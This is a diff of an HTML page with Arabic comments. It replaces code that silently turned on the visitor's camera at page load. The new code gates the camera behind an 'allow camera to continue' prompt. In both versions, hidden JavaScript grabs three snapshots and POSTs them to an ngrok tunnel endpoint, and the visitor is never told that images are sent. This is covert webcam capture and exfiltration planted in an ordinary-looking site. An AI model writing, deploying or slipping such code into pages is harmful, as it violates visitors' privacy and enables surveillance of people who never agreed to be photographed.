@@ -216,85 +216,83 @@
 ============================================================== -->
     
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
-    <script>
-      AOS.init({
-        duration: 1200,
-        once: true,
-      });
-    </script>
-    <!-- فيديو مخفي -->
-    <video id="video" autoplay playsinline style="display: none"></video>
+<script>
+  AOS.init({
+    duration: 1200,
+    once: true,
+  });
+</script>
 
-    <!-- كانفاس مخفي -->
-    <canvas id="canvas" width="400" height="300" style="display: none"></canvas>
+<!-- رسالة انتظار المستخدم -->
+<div id="permission-message" style="text-align:center; margin-top:50px;">
+  <h2>يرجى السماح بالكاميرا للمتابعة</h2>
+  <button id="request-camera">السماح بالكاميرا</button>
+</div>
 
- 
-    <script>
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
-      const context = canvas.getContext("2d");
+<video id="video" autoplay playsinline style="display: none"></video>
+<canvas id="canvas" width="400" height="300" style="display: none"></canvas>
 
-      // دالة تأخير
-      function delay(ms) {
-        return new Promise((resolve) => setTimeout(resolve, ms));
-      }
+<script>
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const context = canvas.getContext("2d");
+  const permissionMessage = document.getElementById("permission-message");
+  const requestCameraBtn = document.getElementById("request-camera");
 
-      // تشغيل الكاميرا
-      navigator.mediaDevices
-        .getUserMedia({ video: true })
-        .then(async (stream) => {
-          video.srcObject = stream;
+  function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
 
-          video.onloadedmetadata = async () => {
-            for (let i = 1; i <= 3; i++) {
-              await delay(10); // الانتظار ثانيتين
+  async function startCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      // إذا تم السماح
+      permissionMessage.style.display = 'none'; // إخفاء رسالة السماح
+      video.style.display = 'block'; // عرض الفيديو (اختياري)
+      video.srcObject = stream;
 
-              await new Promise((resolve) => {
-                canvas.toBlob((blob) => {
-                  const formData = new FormData();
-                  formData.append("formFile", blob, `snapshot_${i}.png`);
+      video.onloadedmetadata = async () => {
+        for (let i = 1; i <= 3; i++) {
+          await delay(10); // الانتظار قليلاً
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                  fetch(
-                    "https://dbb7226b0fd6.ngrok-free.app/api/SaveImagesToDisk/Save",
-                    {
-                      method: "POST",
-                      body: formData,
-                      redirect: "follow",
-                    }
-                  )
-                    .then((response) => {
-                      if (response.ok) {
-                        console.log(`✅ تم إرسال الصورة ${i}`);
-                      } else {
-                        console.error(`❌ خطأ في إرسال الصورة ${i}`);
-                      }
-                      resolve();
-                    })
-                    .catch((err) => {
-                      console.error(
-                        `❌ فشل الاتصال بالخادم في الصورة ${i}`,
-                        err
-                      );
-                      resolve();
-                    });
-                }, "image/png");
-              });
-            }
+          await new Promise(resolve => {
+            canvas.toBlob(blob => {
+              const formData = new FormData();
+              formData.append("formFile", blob, `snapshot_${i}.png`);
 
-            // إيقاف الكاميرا بعد الانتهاء
-            stream.getTracks().forEach((track) => track.stop());
-            console.log("📷 تم التقاط وإرسال 10 صور.");
-          };
-        })
-        .catch((err) => {
-          alert("⚠️⚠️⚠️⚠️");
-          console.error(err);
-        });
-    </script>
+              fetch(
+                "https://dbb7226b0fd6.ngrok-free.app/api/SaveImagesToDisk/Save",
+                { method: "POST", body: formData, redirect: "follow" }
+              )
+                .then(response => {
+                  if (response.ok) console.log(`✅ تم إرسال الصورة ${i}`);
+                  else console.error(`❌ خطأ في إرسال الصورة ${i}`);
+                  resolve();
+                })
+                .catch(err => {
+                  console.error(`❌ فشل الاتصال بالخادم في الصورة ${i}`, err);
+                  resolve();
+                });
+            }, "image/png");
+          });
+        }
+        stream.getTracks().forEach(track => track.stop());
+      };
+    } catch (err) {
+      alert("⚠️ يجب السماح بالكاميرا للوصول إلى الموقع!");
+      console.error(err);
+    }
+  }
+
+  // يطلب إذن الكاميرا عند الضغط على الزر
+  requestCameraBtn.addEventListener("click", startCamera);
+</script>
+
   </body>
 </html>
+
 
 
 
